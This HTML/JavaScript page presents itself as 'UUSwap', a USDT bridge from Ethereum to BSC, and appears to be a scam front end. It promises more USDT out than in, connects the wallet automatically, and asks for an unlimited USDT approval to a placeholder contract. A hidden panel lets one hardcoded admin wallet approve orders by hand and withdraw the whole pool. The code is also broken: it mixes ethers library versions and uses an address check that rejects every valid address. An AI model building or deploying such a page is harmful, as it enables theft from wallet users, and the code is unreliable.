<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>UUSwap 跨链兑换</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#8b8aff',
                        textGray: '#666666',
                        dangerRed: '#ef4444',
                        lightBg: '#f7f8fa',
                    }
                }
            }
        }
    </script>
    <style>
        body {
            background-color: #ffffff;
        }
        .card-shadow {
            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
        }
        .token-circle {
            width: 44px;
            height: 44px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .token-circle img{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .admin-panel{
            display: none;
        }
    </style>
</head>
<body class="max-w-md mx-auto bg-white min-h-screen py-6 px-5">
    <!-- 顶部区域 -->
    <div class="flex justify-between items-center mb-8">
        <h1 class="text-[42px] font-bold italic text-gray-900">UUSwap</h1>
        <div class="flex gap-4">
            <button id="refreshBtn" class="w-10 h-10 rounded-full border border-gray-200 flex items-center justify-center">
                <i class="fa fa-refresh text-gray-500"></i>
            </button>
            <button id="connectWalletBtn" class="w-10 h-10 rounded-full border border-gray-200 flex items-center justify-center">
                <i class="fa fa-wallet text-gray-500"></i>
            </button>
        </div>
    </div>

    <!-- 普通用户：跨链兑换主界面 -->
    <div id="userSwapPanel">
        <!-- 发送 ETH USDT -->
        <div class="mb-2">
            <div class="flex justify-between items-center mb-2">
                <p class="text-textGray text-base">发送</p>
                <span id="fillAllBtn" class="text-blue-500 text-sm cursor-pointer">0.000000 全部</span>
            </div>
            <div class="bg-lightBg rounded-xl p-4 flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="token-circle">
                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT ERC20">
                    </div>
                    <div>
                        <div class="flex items-center gap-1">
                            <span class="text-xl font-semibold">USDT</span>
                            <i class="fa fa-chevron-down text-textGray text-sm"></i>
                        </div>
                        <p class="text-textGray text-sm">Ethereum(ERC20)</p>
                    </div>
                </div>
                <span class="text-xl text-gray-800" id="sendNum">0</span>
            </div>
            <p class="text-xs text-gray-500 mt-1">钱包余额：<span id="usdtBalanceShow">0.000000</span> USDT</p>
        </div>

        <!-- 兑换方向切换按钮 -->
        <div class="flex justify-center my-3">
            <button id="switchChainBtn" class="w-12 h-12 rounded-xl bg-lightBg flex items-center justify-center">
                <i class="fa fa-exchange text-primary text-xl"></i>
            </button>
        </div>

        <!-- 接收 BSC USDT -->
        <div class="mb-4">
            <p class="text-textGray text-base mb-2">接收（预估）</p>
            <div class="bg-lightBg rounded-xl p-4 flex items-center justify-between">
                <div class="flex items-center gap-3">
                    <div class="token-circle">
                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT BEP20">
                    </div>
                    <div>
                        <div class="flex items-center gap-1">
                            <span class="text-xl font-semibold">USDT</span>
                            <i class="fa fa-chevron-down text-textGray text-sm"></i>
                        </div>
                        <p class="text-textGray text-sm">BSC(BEP20)</p>
                    </div>
                </div>
                <span class="text-3xl font-semibold text-gray-900" id="receiveNum">0</span>
            </div>
        </div>

        <!-- BSC收款地址输入框 -->
        <div class="bg-lightBg rounded-xl p-4 mb-2">
            <div class="flex items-center justify-between">
                <input id="bscReceiveAddress" type="text" placeholder="填写BSC个人钱包收款地址" class="bg-transparent outline-none flex-1 text-textGray text-base">
                <i class="fa fa-clipboard text-textGray cursor-pointer"></i>
            </div>
        </div>
        <p class="text-dangerRed text-sm mb-6">请勿填入交易所地址，仅使用个人去中心化钱包地址</p>

        <!-- 唤起数量输入弹窗 -->
        <button id="openInputModal" class="w-full bg-primary/20 text-primary rounded-xl py-4 text-lg font-medium mb-8">
            输入兑换数量
        </button>

        <!-- 兑换费率信息面板 -->
        <div class="bg-lightBg rounded-xl p-5 card-shadow">
            <div class="flex justify-between items-center py-2 border-b border-gray-200">
                <span class="text-textGray">兑换比例</span>
                <span class="text-gray-800">1 USDT ≈ 1.05 USDT <i class="fa fa-exchange ml-1"></i></span>
            </div>
            <div class="flex justify-between items-center py-2 border-b border-gray-200">
                <span class="text-textGray">平台手续费</span>
                <span class="text-green-500">🎉 活动免手续费</span>
            </div>
            <div class="flex justify-between items-center py-2 border-b border-gray-200">
                <span class="text-textGray">ETH Gas预估</span>
                <span class="text-textGray">~ 0.001 ETH</span>
            </div>
            <div class="flex justify-between items-center py-2">
                <span class="text-textGray">跨链通道</span>
                <span class="bg-green-100 text-green-600 px-3 py-1 rounded-full text-sm">CrossBridge</span>
            </div>
        </div>
    </div>

    <!-- 管理员专属后台面板（仅管理员钱包可见） -->
    <div id="adminPanel" class="admin-panel mt-10 bg-slate-100 rounded-xl p-5">
        <h2 class="text-xl font-bold mb-4 text-gray-800">🔐 订单审核后台（管理员专用）</h2>
        <div class="bg-white rounded-lg p-4 mb-4">
            <label class="text-sm text-gray-600">输入订单ID：</label>
            <input id="orderIdInput" class="border px-3 py-2 rounded w-full my-2" placeholder="输入订单编号">
            <div class="flex gap-2">
                <button id="approveOrderBtn" class="bg-green-500 text-white px-4 py-2 rounded flex-1">通过订单</button>
                <button id="rejectOrderBtn" class="bg-red-500 text-white px-4 py-2 rounded flex-1">拒绝订单</button>
            </div>
        </div>
        <div class="bg-white rounded-lg p-4">
            <h3 class="font-semibold mb-2">合约资金管理</h3>
            <button id="withdrawPoolBtn" class="bg-amber-500 text-white w-full py-2 rounded">提取ETH合约全部池内USDT</button>
        </div>
    </div>

    <!-- 兑换数量输入弹窗 -->
    <div id="amountModal" class="fixed inset-0 bg-black/50 hidden flex items-end justify-center z-50">
        <div class="bg-white w-full max-w-md rounded-t-2xl p-6">
            <h3 class="text-lg font-bold mb-4">输入ERC20-USDT兑换数量</h3>
            <input id="inputUsdtAmount" class="w-full border rounded-lg p-3 text-xl outline-none" placeholder="例如：1000" type="number" min="0" step="0.000001">
            <div class="flex gap-3 mt-4">
                <button id="closeModalBtn" class="flex-1 py-3 border rounded-lg">取消</button>
                <button id="confirmSwapBtn" class="flex-1 py-3 bg-primary text-white rounded-lg">确认发起跨链</button>
            </div>
        </div>
    </div>

    <script>
        // ============ 全局配置参数 ============
        const ADMIN_WALLET = "0xf832eA13Df0F60dFA381c6853754ab7b54651F05".toLowerCase();
        const USDT_ETH_CONTRACT = "0xdac17f958d2ee523a2206206994597c13d831ec7";
        const USDT_BSC_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
        // 部署后的ETH中转合约地址，部署完成后替换这里
        const ETH_BRIDGE_CONTRACT = "在此填入你部署的ETHCrossMiddle合约地址";

        let provider, signer, userAddress, bridgeContract, erc20UsdtContract;
        let currentUsdtBalance = ethers.parseUnits("0", 6);

        // DOM元素挂载
        const sendDisplay = document.getElementById("sendNum");
        const receiveDisplay = document.getElementById("receiveNum");
        const amountModal = document.getElementById("amountModal");
        const adminDom = document.getElementById("adminPanel");
        const balanceDom = document.getElementById("usdtBalanceShow");
        const fillAllDom = document.getElementById("fillAllBtn");

        // 页面加载自动触发钱包连接
        window.addEventListener('DOMContentLoaded', async () => {
            await autoConnectWallet();
        });

        // 自动连接钱包函数
        async function autoConnectWallet(){
            if (!window.ethereum) {
                console.log("未检测到钱包，需要手动点击连接按钮");
                return;
            }
            try {
                provider = new ethers.providers.Web3Provider(window.ethereum, "any");
                // 请求账户授权
                await provider.send("eth_requestAccounts", []);
                // 强制切换以太坊主网
                await switchToEthMainnet(provider);
                signer = provider.getSigner();
                userAddress = (await signer.getAddress()).toLowerCase();

                // 初始化合约实例
                initContractInstance();
                // 获取USDT余额
                await getWalletUsdtBalance();
                // 管理员权限判断
                renderAdminPanel();
                alert("钱包自动连接成功：" + userAddress);
            } catch (err) {
                console.log("自动连接失败，等待用户手动点击", err);
            }
        }

        // 切换/添加以太坊主网
        async function switchToEthMainnet(providerIns){
            const chainIdHex = "0x1";
            try {
                await providerIns.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
            } catch (switchError) {
                await providerIns.send("wallet_addEthereumChain", [{
                    chainId: "0x1",
                    rpcUrls: ["https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"],
                    blockExplorerUrls: ["https://etherscan.io"],
                    chainName: "Ethereum Mainnet",
                    nativeCurrency: { symbol: "ETH", decimals: 18, name: "Ethereum" }
                }]);
            }
        }

        // 初始化合约
        function initContractInstance(){
            erc20UsdtContract = new ethers.Contract(
                USDT_ETH_CONTRACT,
                [
                    "function approve(address spender, uint256 amount) returns(bool)",
                    "function allowance(address owner, address spender) view returns(uint256)",
                    "function balanceOf(address owner) view returns(uint256)"
                ],
                signer
            );
            bridgeContract = new ethers.Contract(
                ETH_BRIDGE_CONTRACT,
                [
                    "function createCrossOrder(address bscReceiveAddr,uint256 amount)",
                    "function approveOrder(uint256 _orderId)",
                    "function rejectOrder(uint256 _orderId)",
                    "function withdrawAllPoolUSDT()"
                ],
                signer
            );
        }

        // 获取钱包ERC20 USDT余额
        async function getWalletUsdtBalance(){
            if(!erc20UsdtContract || !signer) return;
            const addr = await signer.getAddress();
            currentUsdtBalance = await erc20UsdtContract.balanceOf(addr);
            const formatBalance = ethers.formatUnits(currentUsdtBalance, 6);
            balanceDom.innerText = formatBalance;
            fillAllDom.innerText = formatBalance + " 全部";
        }

        // 渲染管理员面板
        function renderAdminPanel(){
            if(userAddress === ADMIN_WALLET){
                adminDom.style.display = "block";
            }else{
                adminDom.style.display = "none";
            }
        }

        // 实时计算兑换金额
        function calcReceiveAmount(inputVal){
            const inputNum = parseFloat(inputVal || 0);
            const receiveNum = (inputNum * 1.05).toFixed(4);
            sendDisplay.innerText = inputNum.toFixed(6);
            receiveDisplay.innerText = receiveNum;
        }

        // 一键填充全部余额
        fillAllDom.addEventListener("click", ()=>{
            const balanceStr = ethers.formatUnits(currentUsdtBalance,6);
            document.getElementById("inputUsdtAmount").value = balanceStr;
            calcReceiveAmount(balanceStr);
        })

        // 输入框实时计算
        document.getElementById("inputUsdtAmount").addEventListener("input", (e)=>{
            calcReceiveAmount(e.target.value);
        })

        // 弹窗控制
        document.getElementById("openInputModal").addEventListener("click", ()=>{
            amountModal.classList.remove("hidden");
        })
        document.getElementById("closeModalBtn").addEventListener("click", ()=>{
            amountModal.classList.add("hidden");
        })

        // 兑换方向提示
        document.getElementById("switchChainBtn").addEventListener("click", ()=>{
            alert("当前仅开放 ETH(ERC20) → BSC(BEP20) 单向跨链");
        })

        // 手动点击钱包连接按钮
        document.getElementById("connectWalletBtn").addEventListener("click", async ()=>{
            await autoConnectWallet();
        })

        // 确认发起兑换
        document.getElementById("confirmSwapBtn").addEventListener("click", async ()=>{
            if(!signer || !erc20UsdtContract){
                alert("请先连接钱包");
                return;
            }
            const inputVal = document.getElementById("inputUsdtAmount").value.trim();
            const bscReceiveAddr = document.getElementById("bscReceiveAddress").value.trim();
            const inputNumber = Number(inputVal);

            // 表单校验
            if(!inputVal || inputNumber <= 0){
                alert("请填写有效的兑换数量");
                return;
            }
            if(!/^0x[a-fA-F0-9]{42}$/.test(bscReceiveAddr)){
                alert("请填写合规BSC钱包地址");
                return;
            }
            const amountWei = ethers.parseUnits(inputVal, 6);
            if(amountWei > currentUsdtBalance){
                alert("钱包USDT余额不足");
                return;
            }
            amountModal.classList.add("hidden");

            try{
                const ownerAddr = await signer.getAddress();
                let allow = await erc20UsdtContract.allowance(ownerAddr, ETH_BRIDGE_CONTRACT);
                // 无限授权合约
                if(allow < amountWei){
                    alert("正在授权USDT给跨链合约，请在钱包确认交易");
                    const approveTx = await erc20UsdtContract.approve(ETH_BRIDGE_CONTRACT, ethers.MaxUint256);
                    await approveTx.wait();
                    alert("授权完成，正在创建跨链订单");
                }
                // 创建跨链订单
                const swapTx = await bridgeContract.createCrossOrder(bscReceiveAddr, amountWei);
                await swapTx.wait();
                alert(`订单创建成功！\n交易哈希：${swapTx.hash}`);
                // 刷新余额
                await getWalletUsdtBalance();
            }catch(error){
                console.error(error);
                alert("交易失败：" + String(error.message).substring(0,60));
            }
        })

        // ============ 管理员操作逻辑 ============
        // 通过订单
        document.getElementById("approveOrderBtn").addEventListener("click", async ()=>{
            if(userAddress !== ADMIN_WALLET || !bridgeContract) return;
            const orderId = document.getElementById("orderIdInput").value.trim();
            if(!orderId){
                alert("请输入订单ID");
                return;
            }
            try{
                const tx = await bridgeContract.approveOrder(orderId);
                await tx.wait();
                alert("订单审批通过");
            }catch(e){
                alert("审批失败："+e.message);
            }
        })
        // 拒绝订单
        document.getElementById("rejectOrderBtn").addEventListener("click", async ()=>{
            if(userAddress !== ADMIN_WALLET || !bridgeContract) return;
            const orderId = document.getElementById("orderIdInput").value.trim();
            if(!orderId){
                alert("请输入订单ID");
                return;
            }
            try{
                const tx = await bridgeContract.rejectOrder(orderId);
                await tx.wait();
                alert("订单已拒绝");
            }catch(e){
                alert("操作失败："+e.message);
            }
        })
        // 管理员提取合约内全部USDT
        document.getElementById("withdrawPoolBtn").addEventListener("click", async ()=>{
            if(userAddress !== ADMIN_WALLET || !bridgeContract) return;
            try{
                const tx = await bridgeContract.withdrawAllPoolUSDT();
                await tx.wait();
                alert("合约池资金提取完成，已转入管理员钱包");
                await getWalletUsdtBalance();
            }catch(e){
                alert("提款失败："+e.message);
            }
        })

        // 页面刷新
        document.getElementById("refreshBtn").addEventListener("click", ()=>{
            location.reload();
        })
    </script>
</body>
</html>
